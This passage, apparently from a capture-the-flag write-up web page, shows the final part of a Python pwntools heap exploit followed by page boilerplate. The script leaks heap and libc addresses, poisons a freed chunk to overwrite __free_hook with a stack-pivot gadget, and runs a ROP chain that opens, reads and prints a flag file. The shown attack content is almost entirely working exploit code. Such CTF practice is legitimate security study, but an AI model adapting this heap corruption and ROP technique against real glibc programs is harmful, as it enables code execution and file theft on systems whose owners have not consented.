</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap base : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cccc&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;dddd&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x570</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;push&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">view</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3ebca0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc base : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x521b5</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x521ff</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rax</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x43ae8</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x23eea</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x215bf</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1b96</span>
</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xd2745</span>
</span></span><span class="line"><span class="cl"><span class="n">read</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;eeee&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/etc/passwd</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">rsp_value</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xfd0</span>                           <span class="c1"># Calculated using a debugger</span>
</span></span><span class="line"><span class="cl"><span class="n">rcx_value</span> <span class="o">=</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="n">ropchain</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsp_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rcx_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span>                                <span class="c1"># sets rax to the target syscall number</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>                                      <span class="c1"># SYS_OPEN</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>                                <span class="c1"># pointer to path</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x7a0</span><span class="p">)</span>                      <span class="c1"># address of string /home/user/flag.txt</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>                                <span class="c1"># sets the fd value</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>                                      <span class="c1"># fd of the recently opened file</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>                                <span class="c1"># sets the where the content will be written</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span>                              <span class="c1"># any writeable address</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span>                                <span class="c1"># sets the number of bytes to read</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>                                <span class="c1"># address of the data read</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x800</span><span class="p">,</span> <span class="n">ropchain</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div>


                    </div>
                </div>
            </div>
        </div>
    </div>

    


    

    

    <div id="modal" class="modal">
        <img id="modal-content" class="modal-content">
    </div>
    <script>

        if (typeof screen.orientation !== 'undefined') {
            
            var modal = document.getElementById('modal');

            modal.addEventListener('click', function (e) {
                if (e.target === e.currentTarget) {
                    modal.style.display = "none";
                    document.body.style.overflowY = "visible"
                }
            });
            document.addEventListener('keydown', function (e) {
                if (e.key === "Escape") {
                    modal.style.display = "none";
                    document.body.style.overflowY = "visible"
                }
            })

            document.addEventListener('click', function (e) {
                if (e.target.parentElement.parentElement.className.indexOf('figure') !== -1) {
                    var img = e.target;
                    var modalImg = document.getElementById("modal-content");
                    document.body.style.overflowY = "hidden"
                    modal.style.display = "flex";
                    modalImg.src = img.src;
                }
            });

        }


    </script>

    

</body>

</html>